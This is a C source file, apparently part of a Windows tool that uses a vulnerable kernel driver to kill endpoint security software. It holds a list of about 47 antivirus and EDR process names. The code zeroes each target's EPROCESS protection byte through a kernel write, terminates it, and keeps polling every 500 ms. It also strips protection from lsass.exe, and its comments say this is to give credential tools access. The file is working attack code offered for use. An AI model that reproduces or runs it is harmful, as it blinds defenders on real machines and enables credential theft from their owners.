#include "RemovePPL.h"
#include "PdFwKrnl.h"
#include <stdio.h>
#include <wchar.h>
#include <TlHelp32.h>

// ---------------------------------------------------------------------------
// Target process list (defined here, declared extern in ppl.h)
// ---------------------------------------------------------------------------
LPCWSTR g_TargetProcessNames[] = {
    L"MsSense.exe",
    L"MsMpEng.exe",
    L"CSFalconService.exe",
    L"SentinelAgent.exe",
    L"sentinelservicehost.exe",
    L"SescLU.exe",
    L"seplu.exe",
    L"mfefire.exe",
    L"mfeepmpk.exe",
    L"SAVService.exe",
    L"SAVAdminService.exe",
    L"EPConsole.exe",
    L"bdservicehost.exe",
    L"ekrn.exe",
    L"mbamservice.exe",
    L"WRSA.exe",
    L"AvastSvc.exe",
    L"AvastUI.exe",
    L"avp.exe",
    L"xagt.exe",
    L"sfc.exe",
    L"CyveraService.exe",
    L"traps.exe",
    L"ntrtscan.exe",
    L"pccntmon.exe",
    L"TracSrvWrapper.exe",
    L"cpda.exe",
    L"cmdagent.exe",
    L"CybereasonRansomFreeService.exe",
    L"elastic-endpoint.exe",
    L"AirWatchService.exe",
    L"nwservice.exe",
    L"MfeEpeHost.exe",
    L"fdedr.exe",
    L"cyserver.exe",
    L"BlackBerryProtect.exe",
    L"rapid7.exe",
    L"tanclient.exe",
    L"secureworks.exe",
    L"endgame.exe",
    L"hexis.exe",
    L"darktracetsa.exe",
    L"dsmonitor.exe",
    L"dwengine.exe",
    L"cytomicendpoint.exe",
    L"safe.exe",
    L"raytheon.exe"
};

const DWORD g_TargetProcessCount =
(DWORD)(sizeof(g_TargetProcessNames) / sizeof(g_TargetProcessNames[0]));

// ---------------------------------------------------------------------------
// NtQuerySystemInformation glue ??? SystemExtendedHandleInformation (64)
// ---------------------------------------------------------------------------
#define SystemExtendedHandleInformation 64

typedef struct _SYSTEM_HANDLE_EX {
    PVOID     Object;           // kernel VA of the object (EPROCESS for processes)
    ULONG_PTR UniqueProcessId;
    ULONG_PTR HandleValue;
    ULONG     GrantedAccess;
    USHORT    CreatorBackTraceIndex;
    USHORT    ObjectTypeIndex;
    ULONG     HandleAttributes;
    ULONG     Reserved;
} SYSTEM_HANDLE_EX;

typedef struct _SYSTEM_HANDLE_INFO_EX {
    ULONG_PTR    NumberOfHandles;
    ULONG_PTR    Reserved;
    SYSTEM_HANDLE_EX Handles[1];
} SYSTEM_HANDLE_INFO_EX;

typedef LONG(WINAPI* fnNtQSI)(ULONG, PVOID, ULONG, PULONG);
typedef LONG(WINAPI* fnRtlGetVersion)(PRTL_OSVERSIONINFOW);

// ---------------------------------------------------------------------------
// Windows build number
// ---------------------------------------------------------------------------
static DWORD GetBuildNumber(void) {
    fnRtlGetVersion RtlGetVer = (fnRtlGetVersion)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlGetVersion");
    if (!RtlGetVer) return 0;
    RTL_OSVERSIONINFOW oi = { sizeof(oi) };
    RtlGetVer(&oi);
    return oi.dwBuildNumber;
}

// ---------------------------------------------------------------------------
// Static offset tables for EPROCESS fields (x64 only)
//
// Verify with WinDbg: dt nt!_EPROCESS
//   UniqueProcessId  ??? ULONG_PTR ??? must equal the process PID
//   Protection       ??? UCHAR     ??? PS_PROTECTION byte; zero = unprotected
//
// Build ranges:
//   14393???17763  Windows 10 1607???1809
//   18362???22631  Windows 10 1903 ??? Windows 11 23H2
//   26100+       Windows 11 24H2
// ---------------------------------------------------------------------------
typedef struct _EPROC_OFFSETS {
    DWORD dwBuildMin;
    DWORD dwBuildMax;
    DWORD dwUniqueProcessId;  // EPROCESS.UniqueProcessId
    DWORD dwProtection;       // EPROCESS.Protection  (PS_PROTECTION, 1 byte)
} EPROC_OFFSETS;

static const EPROC_OFFSETS kEprocTable[] = {
    { 14393, 17763, 0x2E8, 0x6CA },
    { 18362, 22631, 0x440, 0x87A },
    { 26100, 99999, 0x440, 0x9CA },
};

static BOOL LookupEprocOffsets(DWORD dwBuild, DWORD* pPidOff, DWORD* pProtOff) {
    for (DWORD i = 0; i < sizeof(kEprocTable) / sizeof(kEprocTable[0]); i++) {
        if (dwBuild >= kEprocTable[i].dwBuildMin &&
            dwBuild <= kEprocTable[i].dwBuildMax) {
            *pPidOff = kEprocTable[i].dwUniqueProcessId;
            *pProtOff = kEprocTable[i].dwProtection;
            return TRUE;
        }
    }
    return FALSE;
}

// ---------------------------------------------------------------------------
// Scan a local EPROCESS buffer for the PID value (8-byte aligned search).
// Returns the offset inside pBuf, or (DWORD)-1 if not found.
// ---------------------------------------------------------------------------
static DWORD ScanEprocForPid(const BYTE* pBuf, DWORD cbBuf, DWORD dwPid) {
    for (DWORD i = 0; i + sizeof(ULONG_PTR) <= cbBuf; i += sizeof(ULONG_PTR)) {
        if (*(const ULONG_PTR*)(pBuf + i) == (ULONG_PTR)dwPid)
            return i;
    }
    return (DWORD)-1;
}

// ---------------------------------------------------------------------------
// Retrieve the kernel VA of a process object (EPROCESS) by matching our own
// PID + the handle value inside SystemExtendedHandleInformation.
// ---------------------------------------------------------------------------
static ULONG_PTR GetEprocessAddress(HANDLE hProcess) {
    fnNtQSI NtQSI = (fnNtQSI)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    if (!NtQSI) return 0;

    DWORD      dwMyPid = GetCurrentProcessId();
    ULONG_PTR  hValue = (ULONG_PTR)hProcess;
    ULONG      cb = 0x80000;
    SYSTEM_HANDLE_INFO_EX* pInfo = NULL;
    LONG       status;

    // Grow the buffer until NtQSI is satisfied.
    do {
        HeapFree(GetProcessHeap(), 0, pInfo);
        pInfo = (SYSTEM_HANDLE_INFO_EX*)
            HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cb);
        if (!pInfo) return 0;
        status = NtQSI(SystemExtendedHandleInformation, pInfo, cb, &cb);
        cb += 0x10000;
    } while (status == 0xC0000004L); // STATUS_INFO_LENGTH_MISMATCH

    if (status != 0) {
        HeapFree(GetProcessHeap(), 0, pInfo);
        return 0;
    }

    ULONG_PTR uResult = 0;
    for (ULONG_PTR i = 0; i < pInfo->NumberOfHandles; i++) {
        SYSTEM_HANDLE_EX* e = &pInfo->Handles[i];
        if (e->UniqueProcessId == (ULONG_PTR)dwMyPid &&
            e->HandleValue == hValue) {
            uResult = (ULONG_PTR)e->Object;
            break;
        }
    }

    HeapFree(GetProcessHeap(), 0, pInfo);
    return uResult;
}

// ---------------------------------------------------------------------------
// Core PPL removal: zero EPROCESS.Protection via the PDFWKRNL kernel write.
//
// Strategy:
//  1. Use static offset table (by build) to find UniqueProcessId.
//  2. Read UniqueProcessId from kernel; compare to dwPid to validate.
//  3. If mismatch, brute-scan the EPROCESS buffer for the PID dynamically.
//  4. Apply known relative deltas to locate the Protection byte.
//  5. Write 0 to clear PPL.
// ---------------------------------------------------------------------------
static BOOL RemovePPLFromEprocess(HANDLE hDev, ULONG_PTR uEproc, DWORD dwPid) {
    DWORD dwBuild = GetBuildNumber();
    printf("  [*] Windows build: %lu\n", (unsigned long)dwBuild);

    // Read a generous EPROCESS chunk into a local buffer for analysis.
    const DWORD cbChunk = 0x1200;
    BYTE* pBuf = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbChunk);
    if (!pBuf) return FALSE;

    if (!KReadMem(hDev, uEproc, pBuf, cbChunk)) {
        printf("  [-] KReadMem EPROCESS failed\n");
        HeapFree(GetProcessHeap(), 0, pBuf);
        return FALSE;
    }

    // ------------------------------------------------------------------
    // Step 1: find UniqueProcessId offset.
    // ------------------------------------------------------------------
    DWORD dwPidOff = (DWORD)-1;
    DWORD dwProtOff = (DWORD)-1;
    DWORD dwStaticPidOff = 0;
    DWORD dwStaticProtOff = 0;
    BOOL  bHaveStatic = LookupEprocOffsets(dwBuild, &dwStaticPidOff, &dwStaticProtOff);

    if (bHaveStatic) {
        // Validate the static offset by checking that PID matches.
        ULONG_PTR uReadPid = 0;
        if (dwStaticPidOff + sizeof(ULONG_PTR) <= cbChunk)
            uReadPid = *(ULONG_PTR*)(pBuf + dwStaticPidOff);

        if (uReadPid == (ULONG_PTR)dwPid) {
            dwPidOff = dwStaticPidOff;
            dwProtOff = dwStaticProtOff;
            printf("  [*] EPROCESS offsets (table): UniqueProcessId=0x%X Protection=0x%X\n",
                dwPidOff, dwProtOff);
        }
        else {
            printf("  [!] Static UniqueProcessId mismatch (expected %lu, got %llu) ??? scanning\n",
                (unsigned long)dwPid, (unsigned long long)uReadPid);
        }
    }

    // ------------------------------------------------------------------
    // Step 2: dynamic scan fallback if static table didn't validate.
    // ------------------------------------------------------------------
    if (dwPidOff == (DWORD)-1) {
        dwPidOff = ScanEprocForPid(pBuf, cbChunk, dwPid);
        if (dwPidOff == (DWORD)-1) {
            printf("  [-] Could not locate UniqueProcessId in EPROCESS\n");
            HeapFree(GetProcessHeap(), 0, pBuf);
            return FALSE;
        }
        printf("  [*] UniqueProcessId found dynamically at offset 0x%X\n", dwPidOff);

        // Try known relative deltas: Win10 1607, Win10 1903, Win11 24H2
        static const DWORD kDeltas[] = { 0x3E2, 0x43A, 0x58A };
        for (DWORD d = 0; d < sizeof(kDeltas) / sizeof(kDeltas[0]); d++) {
            DWORD candidate = dwPidOff + kDeltas[d];
            if (candidate < cbChunk && pBuf[candidate] != 0) {
                dwProtOff = candidate;
                printf("  [*] Protection byte found at offset 0x%X (delta +0x%X) = 0x%02X\n",
                    dwProtOff, kDeltas[d], pBuf[candidate]);
                break;
            }
        }

        if (dwProtOff == (DWORD)-1) {
            // Process is not PPL protected (Protection == 0 at all known positions).
            printf("  [*] No non-zero Protection byte found; process is not PPL-protected\n");
            HeapFree(GetProcessHeap(), 0, pBuf);
            return TRUE; // Not an error ??? proceed to TerminateProcess.
        }
    }

    // ------------------------------------------------------------------
    // Step 3: read and clear the Protection byte.
    // ------------------------------------------------------------------
    UCHAR ucProt = 0;
    if (dwProtOff < cbChunk)
        ucProt = pBuf[dwProtOff];

    HeapFree(GetProcessHeap(), 0, pBuf);

    printf("  [*] Protection byte @ EPROCESS+0x%X = 0x%02X\n", dwProtOff, ucProt);

    if (ucProt == 0) {
        printf("  [*] Process is not PPL-protected (Protection = 0)\n");
        return TRUE; // Nothing to clear; proceed to TerminateProcess.
    }

    UCHAR ucZero = 0;
    if (!KWriteMem(hDev, uEproc + dwProtOff, &ucZero, sizeof(ucZero))) {
        printf("  [-] KWriteMem Protection failed\n");
        return FALSE;
    }

    printf("  [+] Protection byte cleared ??? PPL removed\n");
    return TRUE;
}

// ---------------------------------------------------------------------------
// Public: remove PPL from a process identified by PID, then terminate it.
// ---------------------------------------------------------------------------
BOOL RemovePPLAndKill(HANDLE hDev, DWORD dwPid, LPCWSTR pwszName) {
    printf("[*] Processing: %ls (PID %lu)\n", pwszName, (unsigned long)dwPid);

    // ------------------------------------------------------------------
    // Fast path: try a direct TERMINATE open (works if process is not PPL).
    // ------------------------------------------------------------------
    HANDLE hTerm = OpenProcess(PROCESS_TERMINATE, FALSE, dwPid);
    if (hTerm) {
        if (!TerminateProcess(hTerm, 1)) {
            printf("  [-] TerminateProcess failed: 0x%08lX\n", GetLastError());
            CloseHandle(hTerm);
            return FALSE;
        }
        printf("  [+] Terminated (no PPL, direct path)\n\n");
        CloseHandle(hTerm);
        return TRUE;
    }

    printf("  [*] Direct TERMINATE denied (0x%08lX) ??? attempting PPL removal\n",
        GetLastError());

    // ------------------------------------------------------------------
    // PPL path: open with limited access to obtain the EPROCESS address.
    // ------------------------------------------------------------------
    HANDLE hQuery = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwPid);
    if (!hQuery) {
        printf("  [-] OpenProcess(QUERY_LIMITED) failed: 0x%08lX\n", GetLastError());
        return FALSE;
    }

    ULONG_PTR uEproc = GetEprocessAddress(hQuery);
    CloseHandle(hQuery);

    if (!uEproc) {
        printf("  [-] Could not resolve EPROCESS kernel address\n");
        return FALSE;
    }
    printf("  [*] EPROCESS @ 0x%llX\n", (unsigned long long)uEproc);

    // Remove PPL via kernel write.
    if (!RemovePPLFromEprocess(hDev, uEproc, dwPid))
        return FALSE;

    // Re-open with TERMINATE now that PPL is cleared.
    hTerm = OpenProcess(PROCESS_TERMINATE, FALSE, dwPid);
    if (!hTerm) {
        printf("  [-] OpenProcess(TERMINATE) still denied after PPL removal: 0x%08lX\n",
            GetLastError());
        return FALSE;
    }

    if (!TerminateProcess(hTerm, 1)) {
        printf("  [-] TerminateProcess failed: 0x%08lX\n", GetLastError());
        CloseHandle(hTerm);
        return FALSE;
    }

    printf("  [+] Terminated successfully\n\n");
    CloseHandle(hTerm);
    return TRUE;
}

// ---------------------------------------------------------------------------
// Public: remove PPL from a process by PID WITHOUT terminating it.
// Used for lsass.exe ??? strips EPROCESS.Protection and returns; the process
// continues running unprotected so that tools can interact with it freely.
// ---------------------------------------------------------------------------
BOOL RemovePPLOnly(HANDLE hDev, DWORD dwPid, LPCWSTR pwszName) {
    printf("[*] Stripping PPL (no kill): %ls (PID %lu)\n",
        pwszName, (unsigned long)dwPid);

    HANDLE hQuery = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwPid);
    if (!hQuery) {
        printf("  [-] OpenProcess(QUERY_LIMITED) failed: 0x%08lX\n", GetLastError());
        return FALSE;
    }

    ULONG_PTR uEproc = GetEprocessAddress(hQuery);
    CloseHandle(hQuery);

    if (!uEproc) {
        printf("  [-] Could not resolve EPROCESS kernel address\n");
        return FALSE;
    }
    printf("  [*] EPROCESS @ 0x%llX\n", (unsigned long long)uEproc);

    BOOL bOk = RemovePPLFromEprocess(hDev, uEproc, dwPid);
    if (bOk)
        printf("  [+] lsass.exe PPL removed ??? process left running\n\n");
    return bOk;
}

// ---------------------------------------------------------------------------
// Infinite monitoring loop.
// Enumerates processes every 500 ms and acts on any target it finds.
// ---------------------------------------------------------------------------

// Find the PID of the first process matching pwszName (case-insensitive).
// Returns 0 if not found.
static DWORD FindProcessByName(LPCWSTR pwszName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    DWORD dwPid = 0;
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, pwszName) == 0) {
                dwPid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnap, &pe));
    }

    CloseHandle(hSnap);
    return dwPid;
}

void MonitorAndKillLoop(HANDLE hDev) {
    // ------------------------------------------------------------------
    // One-shot: strip PPL from lsass.exe without killing it.
    // lsass is always running; we do this once at startup so that the
    // process is immediately accessible to credential tools.
    // ------------------------------------------------------------------
    printf("[*] Looking for lsass.exe to strip PPL...\n");
    DWORD dwLsassPid = FindProcessByName(L"lsass.exe");
    if (dwLsassPid) {
        RemovePPLOnly(hDev, dwLsassPid, L"lsass.exe");
    }
    else {
        printf("  [!] lsass.exe not found ??? skipping\n\n");
    }

    printf("[*] Monitoring started (poll interval: 500 ms) ??? Ctrl+C to stop\n\n");

    while (TRUE) {
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap == INVALID_HANDLE_VALUE) {
            Sleep(500);
            continue;
        }

        PROCESSENTRY32W pe = { sizeof(pe) };
        if (Process32FirstW(hSnap, &pe)) {
            do {
                for (DWORD i = 0; i < g_TargetProcessCount; i++) {
                    if (_wcsicmp(pe.szExeFile, g_TargetProcessNames[i]) == 0) {
                        RemovePPLAndKill(hDev, pe.th32ProcessID, pe.szExeFile);
                    }
                }
            } while (Process32NextW(hSnap, &pe));
        }

        CloseHandle(hSnap);
        Sleep(500);
    }
}
